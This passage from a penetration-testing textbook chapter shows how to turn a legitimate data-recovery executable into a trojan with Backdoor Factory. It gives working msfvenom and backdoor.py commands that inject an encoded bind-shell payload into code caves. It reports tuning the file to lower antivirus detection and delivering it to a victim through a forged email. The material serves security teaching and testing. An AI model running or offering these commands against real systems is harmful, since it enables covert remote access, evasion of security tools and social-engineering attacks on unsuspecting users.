<img alt="Figure 12.10 – Finding a code cave in the IDA disassembler " height="449" src="image/Figure_12.10_B17616.jpg" width="679"/>
</div>
</div>
<p class="figure-caption">Figure 12.10 – Finding a code cave in the IDA disassembler</p>
<p>Running BDF without any flags set<a id="_idIndexMarker887"/> will just display these options (as well as a fun ASCII banner). Let’s take a look at what this thing can do. Note that there are a few options here that are out of scope or self-explanatory, so I’ve <a id="_idIndexMarker888"/>skipped them. (In fact, one option is for OnionDuke, and you won’t see too many legitimate white-hat contexts for that one.) You can start the tool with this simple command:</p>
<p class="source-code"># ./backdoor.py</p>
<p>Without any parameters, BDF will let you know what options are available to you:</p>
<ul>
<li><strong class="source-inline">--file=</strong> identifies the binary that you’ll be patching with your code.</li>
<li><strong class="source-inline">--shell=</strong> identifies the payloads that are available for use. You’d use <strong class="source-inline">--shell=show</strong> after defining an executable with <strong class="source-inline">--file=</strong> to see a listing of compatible payloads.</li>
<li><strong class="source-inline">--hostip=</strong> and <strong class="source-inline">--port=</strong> are your standard options for either your connect-back or local bind, depending on the payload.</li>
<li><strong class="source-inline">--cave_jumping</strong> allows us to spread our shellcode over multiple code caves; some code in one cave, then a jump to the next cave, and then to the next.</li>
<li><strong class="source-inline">--add_new_section</strong> adds a<a id="_idIndexMarker889"/> new section in the executable for our shellcode. This isn’t a stealthy option but may be necessary with some executables depending on their structure.</li>
<li><strong class="source-inline">--user_shellcode=</strong> lets us provide our own shellcode (instead of using the built-in payloads). I prefer to have a more personal relationship with my shellcode, so I will almost exclusively use my own.</li>
<li><strong class="source-inline">--cave</strong> and <strong class="source-inline">--shell_length=</strong> are used to hunt for code caves inside a binary. While <strong class="source-inline">--cave</strong> can find <a id="_idIndexMarker890"/>them all and list them, <strong class="source-inline">--shell_length=</strong> is used to define caves of a particular size.</li>
<li><strong class="source-inline">--output-file=</strong> is where our finished product will go.</li>
<li><strong class="source-inline">--section=</strong> is used when we’re naming our new section created with <strong class="source-inline">--add_new_section</strong>.</li>
<li><strong class="source-inline">--directory=</strong> is a delightful option that makes BDF especially powerful; this allows us to backdoor an entire <em class="italic">directory</em> of binaries. Keep in mind that the default behavior is hunting for code caves, which means each individual executable needs to be processed. By combining this option with <strong class="source-inline">--add_new_section</strong>, BDF won’t need to hunt for caves and this process is a lot faster. Remember the rule of thumb that adding sections is not stealthy.</li>
<li><strong class="source-inline">--change_access</strong> is default behavior; you will only change this in certain situations. This option makes the code cave where our payload lies writable and executable.</li>
<li><strong class="source-inline">--injector</strong>, <strong class="source-inline">--suffix=</strong>, and <strong class="source-inline">--delete_original</strong> are part of the injector module and are Windows-only, so we won’t play with them here. I didn’t skip them because they’re interesting and dangerous. They’re very aggressive and potentially <a id="_idIndexMarker891"/>destructive, so I advise caution. They will hunt the system for patchable executables, inject them, and <a id="_idIndexMarker892"/>save the original file according to the <strong class="source-inline">suffix</strong> parameter. With <strong class="source-inline">--delete_original</strong>, the original untouched executable goes away, leaving behind the injected copy. The <strong class="source-inline">--injector</strong> module will even check to see whether the target is running and, if so, shut it down, inject it, and then attempt to restart it.</li>
<li><strong class="source-inline">--support_check</strong> allows BDF to determine whether the target can be injected without attempting to do so. This check is done when you try to inject a file anyway, so this can be useful for research.</li>
<li><strong class="source-inline">--cave-miner</strong> is for adapting our shellcode generation to fit the target executable rather than the other way around. It helps us to find the smallest possible payload that can fit into one of the available caves.</li>
<li><strong class="source-inline">--verbose</strong> is for debugging the injection process.</li>
<li><strong class="source-inline">--image-type=</strong> lets you identify the binaries to be patched as x86 or x64 (or both). The default is both.</li>
<li><strong class="source-inline">--beacon=</strong> is for payloads that can send out beacons or heartbeats. This option takes an interval in seconds as the argument.</li>
<li><strong class="source-inline">--xp_mode</strong> enables your creation to run on Windows XP. That’s right – by default, a BDF Trojan will crash on XP. This is a sandbox countermeasure – as XP is becoming less and less popular as an actual home (or production) operating system, it’s still finding use in VMs and other environments as a place where you can detonate digital explosives without fear of damaging something valuable. Of course, modern sandboxing takes place in any operating system you please, so this option won’t make an enormous difference. Be aware of it if you’re explicitly targeting XP – plenty of production environments still use XP for application compatibility reasons.</li>
<li><strong class="source-inline">--code_sign</strong> is very useful in the case of secure environments that only trust signed code. This allows you to sign your creation with your own signing certificate and private key. Naturally, you won’t possess legitimate ones for some major software maker (right?), but if the check is for the simple fact that the code is signed<a id="_idIndexMarker893"/> with <em class="italic">any</em> certificate, then this option is very handy. If you aren’t signing your file, then you need to pass <strong class="source-inline">--zero_cert</strong>.</li>
</ul>
<p>This tool gives us quite a bit of control over the injection process. With this kind of low-level control, we can <a id="_idIndexMarker894"/>understand our projects more intimately and fine-tune our Trojans according to our needs. Let’s go ahead and pick an executable that will become our infected program and do some low-level analysis.</p>
<h2 id="_idParaDest-238"><a id="_idTextAnchor237"/>Trojan engineering with BDF and IDA</h2>
<p>The best target binaries are<a id="_idIndexMarker895"/> lightweight and portable – that is, they have few or no dependencies. A program that requires a full installation isn’t ideal. We’re <a id="_idIndexMarker896"/>going to suppose that an employee at our client uses a lightweight piece of freeware for data recovery. During our reconnaissance phase, we established a trust relationship between this employee and another person at the company. We also discovered an open SMTP relay, so we’ll be trying a social engineering attack, suggesting that the employee download the newer version. We’ll send a link that would actually point at our Kali box to pull the Trojaned file.</p>
<p>Before we get started, we will confirm the current status of our target executable from an AV community trust perspective and validate that it is trusted across the board. The program we’re using, <strong class="source-inline">DataRecovery.exe</strong>, is known by the community to be trustworthy. This helps us when trying to gauge the level of evasion we are accomplishing. Grab some coffee and let’s proceed. First, we’ll create our own payload with <strong class="source-inline">msfvenom</strong>:</p>
<p class="source-code"># msfvenom --arch x86 --platform windows --payload windows/shell/bind_tcp EXITFUNC=thread LPORT=1066 --encoder x86/shikata_ga_nai --iterations 5 &gt; trojan.bin</p>
<div>
<div class="IMG---Figure" id="_idContainer257">
<img alt="Figure 12.11 – Generating an encoded payload with msfvenom " height="228" src="image/Figure_12.11_B17616.jpg" width="738"/>
</div>
</div>
<p class="figure-caption">Figure 12.11 – Generating an encoded payload with msfvenom</p>
<p>Do you remember those days <a id="_idIndexMarker897"/>of plenty when we could use the Meterpreter reverse connection payload? That was back when we were wealthy, where<a id="_idIndexMarker898"/> 179 kilobytes made us snootily laugh. Those days are gone when we’re dealing with potentially tiny code caves. I’ve used <strong class="source-inline">windows/shell/bind_tcp</strong> in this case, as it’s far smaller. This affords us room to do multiple iterations of <strong class="source-inline">x86/shikata_ga_nai</strong>. Even with five iterations, we end up with a paltry 482 bytes. The attack will thus require us to connect to the target instead of waiting for the connection back. For my later analysis of the final product, I’ll examine the payload with <strong class="source-inline">xxd</strong> right now so that I can grab some of the raw bytes:</p>
<div>
<div class="IMG---Figure" id="_idContainer258">
<img alt="Figure 12.12 – Grabbing raw bytes from our payload with xxd " height="184" src="image/Figure_12.12_B17616.jpg" width="614"/>
</div>
</div>
<p class="figure-caption">Figure 12.12 – Grabbing raw bytes from our payload with xxd</p>
<p>Next, we’ll fire up BDF and pass our encoded binary as user-supplied shellcode:</p>
<p class="source-code"># ./backdoor.py --file=DataRecovery.exe --shell=user_supplied_shellcode_threaded --user_shellcode=trojan.bin --output-file=datarec.exe --zero_cert</p>
<p>This is where we have some control over the process. Take a look at this prompt, where the appropriate code caves have been identified:</p>
<div>
<div class="IMG---Figure" id="_idContainer259">
<img alt="Figure 12.13 – Examining code caves for our jumps " height="387" src="image/Figure_12.13_B17616.jpg" width="706"/>
</div>
</div>
<p class="figure-caption">Figure 12.13 – Examining code caves for our jumps</p>
<p>Let’s take a dive into the machine <a id="_idIndexMarker899"/>code for this program and examine these memory locations. What we’re really after is a suitable code cave<a id="_idIndexMarker900"/> to place a payload. Why not explore the raw bytes that make up this program as it appears on disk? Using <strong class="source-inline">xxd</strong> as we did earlier in the chapter, I’ll pick on code cave number two – 2,941 bytes in length, it begins at <strong class="source-inline">0x4a47f</strong> and ends at <strong class="source-inline">0x4affc</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer260">
<img alt="Figure 12.14 – Examining the code cave " height="507" src="image/Figure_12.14_B17616.jpg" width="697"/>
</div>
</div>
<p class="figure-caption">Figure 12.14 – Examining the code cave</p>
<p>This looks like a cozy spot for our shellcode. We continue by passing <strong class="source-inline">2</strong> to BDF, and it spits out our Trojaned <a id="_idIndexMarker901"/>executable. I bet you’re feeling like a truly elite world-class hacker at this point. Not so fast, grasshopper – get your evil creation scanned and see how we did on evasion. We ended up with a detection<a id="_idIndexMarker902"/> rate of exactly <em class="italic">50%</em>. Oh, my. One in two scanners picked this up. What happened here? For one, we didn’t employ cave jumping, so our payload was dumped into one spot. We’re going to try cave jumping and then experiment with different sections of the executable:</p>
<p class="source-code"># ./backdoor.py --file=DataRecovery.exe --shell=user_supplied_shellcode_threaded --cave_jumping --user_shellcode=trojan.bin --output-file=datarec3.exe --zero_cert</p>
<p>More advanced analysis of the flow of execution in our chosen program will help us identify the appropriate injection points. For those of us in the field, where time is of the essence, I encourage you to set up a lab that replicates the target’s antimalware defenses as accurately as <a id="_idIndexMarker903"/>possible. Reconnaissance can often yield us information about corporate AV solutions (hint: conduct open source<a id="_idIndexMarker904"/> recon on technical support forums), and we can create payloads via trial and error.</p>
<p>As we’re cave jumping, we have control over which null byte blocks get our chunk of shellcode:</p>
<div>
<div class="IMG---Figure" id="_idContainer261">
<img alt="Figure 12.15 – Selecting caves in BDF " height="519" src="image/Figure_12.15_B17616.jpg" width="706"/>
</div>
</div>
<p class="figure-caption">Figure 12.15 – Selecting caves in BDF</p>
<p>When I selected my caves more carefully, trying to scatter the execution a bit, I was eventually able to create a file with a detection rate of only <em class="italic">10.6%</em>. When we’re happy with the payload, we deliver it via our chosen vector (in our scenario, as a local URL sent via a forged email) and wait for the victim to execute the Trojan. Here, we see the backdoored DataRecovery tool working normally, but in the background, port <strong class="source-inline">1066</strong> is open and waiting for our connection:</p>
<div>
<div class="IMG---Figure" id="_idContainer262">
<img alt="Figure 12.16 – A target executable running with the bound port " height="469" src="image/Figure_12.16_B17616.jpg" width="709"/>
</div>
</div>
<p class="figure-caption">Figure 12.16 – A target executable running with the bound port</p>
<p>As part of your study to get a better handle on what’s happening behind the scenes, don’t forget to dump your Trojan’s <a id="_idIndexMarker905"/>bytes in your favorite tool and look for your shellcode. Look for your shellcode bytes (as we recovered<a id="_idIndexMarker906"/> them in <strong class="source-inline">xxd</strong>, previously):</p>
<div>
<div class="IMG---Figure" id="_idContainer263">
<img alt="Figure 12.17 – Grepping out some of the bytes we collected earlier " height="84" src="image/Figure_12.17_B17616.jpg" width="691"/>
</div>
</div>
<p class="figure-caption">Figure 12.17 – Grepping out some of the bytes we collected earlier</p>
<p>Of course, this is just an extra credit exercise. The idea is to learn more about how the injection works. It’s quite the rabbit hole, so have fun exploring your creations.</p>
<p>Though this wraps up our lab <a id="_idIndexMarker907"/>exercise, keep the core <a id="_idIndexMarker908"/>concept in mind – you may need to conduct significant trial and error before you find something that works in your target environment.</p>
<h1 id="_idParaDest-239"><a id="_idTextAnchor238"/>Summary</h1>
<p>In this chapter, we explored how malicious scripts interact with a host via the interpreter process, creating a unique defense scenario. We looked at a couple of straightforward templates for shellcode injection and data compromise and considered different ways to modify them to confuse scanners.</p>
<p>After this lab, we took a brief dive into the theory of Metasploit’s shellcode generation and understood the function and role of encoders. We explored Windows executable payloads with a quick and easy disassembler within Kali and grepped for byte sequences to learn how to identify patterns in encoded shellcode. Finally, we explored patching legitimate executables to make them effective Trojans using our own payload. A part of this process was a review of the injection points with a hex dump. We explored the still-relevant BDF to identify code caves and the controlled use of them to hold our shellcode.</p>
<p>In the next chapter, we’ll take a look at the lower layers of abstraction from the perspective of the kernel. We’ll look at tried-and-true attacks to gain a core understanding of the underpinnings of kernel vulnerabilities and take a look at practical methods using the Metasploit Framework.</p>
<h1 id="_idParaDest-240"><a id="_idTextAnchor239"/>Questions</h1>
<ol>
<li>What’s the difference between <strong class="source-inline">VirtualAlloc()</strong> and <strong class="source-inline">VirtualAllocEx()</strong>?</li>
<li><strong class="source-inline">MiniDumpWriteDump()</strong> can only be used to attack LSASS. (True | False)</li>
<li>Code caves are sections in backdoor target executables composed of the <strong class="source-inline">0x90</strong> no-operation codes where we can stash our shellcode. (True | False)</li>
<li>When would we need <strong class="source-inline">--xp_mode</strong> when patching a target executable with BDF?</li>
</ol>
</div>
</div></body></html>